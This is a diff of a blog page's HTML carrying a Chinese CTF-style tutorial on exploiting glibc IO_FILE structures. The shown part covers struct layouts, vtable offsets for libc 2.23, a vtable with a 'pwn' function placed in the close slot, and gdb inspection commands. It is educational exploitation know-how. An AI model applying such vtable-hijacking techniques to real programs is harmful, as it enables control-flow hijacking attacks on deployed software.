-    </div>
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2023/10/15/IO_File%E5%88%A9%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/faction/1.png">
-      <meta itemprop="name" content="Kylinxin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Kylinxin's Blog">
-      <meta itemprop="description" content="Kylinxin's Blog">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="IO_File的利用 | Kylinxin's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          IO_File的利用
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-10-15 15:14:29" itemprop="dateCreated datePublished" datetime="2023-10-15T15:14:29+08:00">2023-10-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/IO-File/" itemprop="url" rel="index"><span itemprop="name">IO_File</span></a>
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-15 15:14:29</span>
+            <span class="mobile">2023-10-15 15:14:29</span>
+            <span class="hover-info">更新</span>
         </span>
-    </span>
+    
 
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>6.3k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>23 分钟</span>
-    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/IO-File/">IO_File</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IO-File/">IO_File</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>11 分钟</span>
+        </span>
+    
+    
 </div>
 
-        </div>
-      </header>
+				</div>
+			</div>
+		</div>
+		
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h1 id="【PWN】IO-FILE的利用"><a href="#【PWN】IO-FILE的利用" class="headerlink" title="【PWN】IO_FILE的利用"></a>【PWN】IO_FILE的利用</h1><p>此篇简单的学习一下IO_File的利用</p>
-<h2 id="IO-FILE-的结构"><a href="#IO-FILE-的结构" class="headerlink" title="IO_FILE 的结构"></a>IO_FILE 的结构</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br> <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it's too small.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don't get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="【PWN】IO-FILE的利用"><a href="#【PWN】IO-FILE的利用" class="headerlink" title="【PWN】IO_FILE的利用"></a>【PWN】IO_FILE的利用</h1><p>此篇简单的学习一下IO_File的利用</p>
+<h2 id="IO-FILE-的结构"><a href="#IO-FILE-的结构" class="headerlink" title="IO_FILE 的结构"></a>IO_FILE 的结构</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br> <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it's too small.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don't get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p> IO_FILE实际上还包括在一个IO_FILE_plus中</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 </p>
 <p>IO_FILE_plus结构通过链表链接</p>
@@ -305,19 +622,29 @@
 <p>假设我们open file，其会被插入到链表头位置，类似我们之前学的fastbin 插入。</p>
 <p>它们会存在哪里？</p>
 <p>自动开启的三个文件结构（IO_FILE_plus)会被存放在libc中，后续手动开启的则会被分配在堆区。</p>
-<figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables<br>.data:00000000003C5700                 public stderr<br>.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_<br>.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0↑o<br>.data:00000000003C5700                                         ; fclose+F2↑r ...<br>.data:00000000003C5708                 public stdout<br>.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_<br>.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48↑o<br>.data:00000000003C5708                                         ; fclose+E9↑r ...<br>.data:00000000003C5710                 public stdin<br>.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_<br>.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8↑o<br>.data:00000000003C5710                                         ; fclose:loc_6D340↑r ...<br>.data:00000000003C5718                 dq offset sub_20B70<br>.data:00000000003C5718 _data           ends<br>.data:00000000003C5718<br>.bss:00000000003C5720 ; ===========================================================================<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables<br>.data:00000000003C5700                 public stderr<br>.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_<br>.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0↑o<br>.data:00000000003C5700                                         ; fclose+F2↑r ...<br>.data:00000000003C5708                 public stdout<br>.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_<br>.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48↑o<br>.data:00000000003C5708                                         ; fclose+E9↑r ...<br>.data:00000000003C5710                 public stdin<br>.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_<br>.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8↑o<br>.data:00000000003C5710                                         ; fclose:loc_6D340↑r ...<br>.data:00000000003C5718                 dq offset sub_20B70<br>.data:00000000003C5718 _data           ends<br>.data:00000000003C5718<br>.bss:00000000003C5720 ; ===========================================================================<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>那么什么是 *vtable项呢？</p>
 <p>*vtable是一个指针，指向一个虚表。该虚表中存放了</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * funcs[] = &#123;<br>   <span class="hljs-number">1</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// "extra word"</span><br>   <span class="hljs-number">2</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>   <span class="hljs-number">3</span> <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>   <span class="hljs-number">4</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>   <span class="hljs-number">5</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>   <span class="hljs-number">6</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>   <span class="hljs-number">7</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>   <br>   <span class="hljs-number">8</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn  #printf后面讲解执行流程章节会用到此处</span><br>   <span class="hljs-number">9</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>   <span class="hljs-number">10</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>   <span class="hljs-number">11</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>   <span class="hljs-number">12</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>   <span class="hljs-number">13</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>   <span class="hljs-number">14</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>   <span class="hljs-number">15</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>   <span class="hljs-number">16</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>   <span class="hljs-number">17</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-comment">// close</span><br>   <span class="hljs-number">19</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>   <span class="hljs-number">20</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>   <span class="hljs-number">21</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * funcs[] = &#123;<br>   <span class="hljs-number">1</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// "extra word"</span><br>   <span class="hljs-number">2</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>   <span class="hljs-number">3</span> <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>   <span class="hljs-number">4</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>   <span class="hljs-number">5</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>   <span class="hljs-number">6</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>   <span class="hljs-number">7</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>   <br>   <span class="hljs-number">8</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn  #printf后面讲解执行流程章节会用到此处</span><br>   <span class="hljs-number">9</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>   <span class="hljs-number">10</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>   <span class="hljs-number">11</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>   <span class="hljs-number">12</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>   <span class="hljs-number">13</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>   <span class="hljs-number">14</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>   <span class="hljs-number">15</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>   <span class="hljs-number">16</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>   <span class="hljs-number">17</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-comment">// close</span><br>   <span class="hljs-number">19</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>   <span class="hljs-number">20</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>   <span class="hljs-number">21</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>我们还是随便打开一个程序，dbg看看它的示例吧</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png'><img src="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png" alt="image.png"></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png"
+                      alt="image.png"
+                ><figcaption>image.png</figcaption></figure></p>
 <p>通过 p _IO_list_all 我们可以查看该符号的地址</p>
 <blockquote>
 <p>p  *(struct _IO_FILE_plus *) _IO_list_all</p>
 </blockquote>
-<p class='item-img' data-src='https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png'><img src="https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png" alt="image.png"></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png"
+                      alt="image.png"
+                ><figcaption>image.png</figcaption></figure></p>
 <p>我们这里可以看到vtable项、fileno项与_chain项</p>
 <p>_chain项指向下一个表，如stderr的chain的值就是stdout的地址，fileno存的就是该文件的文件描述符。</p>
 <p>那么这个虚表是干什么的？</p>
@@ -339,8 +666,13 @@
